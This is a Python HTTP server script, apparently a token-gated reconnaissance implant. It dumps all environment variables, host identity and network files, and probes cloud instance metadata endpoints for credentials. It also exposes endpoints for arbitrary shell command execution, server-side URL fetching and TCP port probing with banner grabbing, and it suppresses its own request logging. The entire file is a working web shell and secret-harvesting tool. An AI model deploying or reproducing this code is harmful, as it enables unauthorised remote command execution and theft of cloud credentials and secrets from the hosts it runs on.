import http.server
import json
import os
import socket
import socketserver
import subprocess
import urllib.request
from urllib.parse import urlparse, parse_qs

PORT = int(os.environ.get("PORT", 8080))
RECON_TOKEN = os.environ.get("RECON_TOKEN")  # required — set this as an env var at deploy time


def run(cmd, timeout=5):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout, text=True)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return f"ERROR running {cmd!r}: {e}\n"


def fetch(url, headers=None, timeout=3, max_bytes=4096):
    try:
        req = urllib.request.Request(url, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(max_bytes)
            return {
                "status": resp.status,
                "headers": dict(resp.getheaders()),
                "body": body.decode(errors="replace"),
            }
    except Exception as e:
        return {"error": str(e)}


def tcp_connect(host, port, timeout=3):
    try:
        with socket.create_connection((host, int(port)), timeout=timeout) as s:
            s.settimeout(timeout)
            banner = ""
            try:
                s.sendall(b"\r\n")
                banner = s.recv(256).decode(errors="replace")
            except Exception:
                pass
            return {"open": True, "banner": banner}
    except Exception as e:
        return {"open": False, "error": str(e)}


def recon_report():
    sections = {}
    sections["env"] = dict(sorted(os.environ.items()))
    sections["hostname"] = run("hostname -f 2>/dev/null; hostname")
    sections["id"] = run("id")
    sections["ip_addr"] = run("ip addr 2>/dev/null || ifconfig")
    sections["ip_route"] = run("ip route 2>/dev/null || route -n")
    sections["resolv_conf"] = run("cat /etc/resolv.conf 2>/dev/null")
    sections["etc_hosts"] = run("cat /etc/hosts 2>/dev/null")

    metadata_probes = {
        "aws_imdsv1": "http://169.254.169.254/latest/meta-data/",
        "gcp": "http://169.254.169.254/computeMetadata/v1/?recursive=false",
        "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "digitalocean": "http://169.254.169.254/metadata/v1/",
        "aiven_generic_169": "http://169.254.169.254/",
    }
    md = {}
    for name, url in metadata_probes.items():
        headers = {}
        if name == "gcp":
            headers["Metadata-Flavor"] = "Google"
        if name == "azure":
            headers["Metadata"] = "true"
        md[name] = fetch(url, headers=headers, timeout=2)
    sections["metadata_probes"] = md

    return sections


class Handler(http.server.BaseHTTPRequestHandler):
    def _send_json(self, obj, status=200):
        body = json.dumps(obj, indent=2, default=str).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urlparse(self.path)
        qs = parse_qs(parsed.query)

        if not RECON_TOKEN or qs.get("token", [None])[0] != RECON_TOKEN:
            self._send_json({"error": "forbidden"}, 403)
            return

        if parsed.path == "/connect":
            host = qs.get("host", [None])[0]
            port = qs.get("port", [None])[0]
            if not host or not port:
                self._send_json({"error": "usage: /connect?host=H&port=P"}, 400)
                return
            self._send_json({"host": host, "port": port, "result": tcp_connect(host, port)})
            return

        if parsed.path == "/http":
            url = qs.get("url", [None])[0]
            if not url:
                self._send_json({"error": "usage: /http?url=http://host/path"}, 400)
                return
            self._send_json({"url": url, "result": fetch(url)})
            return

        if parsed.path == "/exec":
            cmd = qs.get("cmd", [None])[0]
            if not cmd:
                self._send_json({"error": "usage: /exec?cmd=..."}, 400)
                return
            self._send_json({"cmd": cmd, "output": run(cmd)})
            return

        self._send_json(recon_report())

    def log_message(self, format, *args):
        pass


if __name__ == "__main__":
    with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
        httpd.serve_forever()
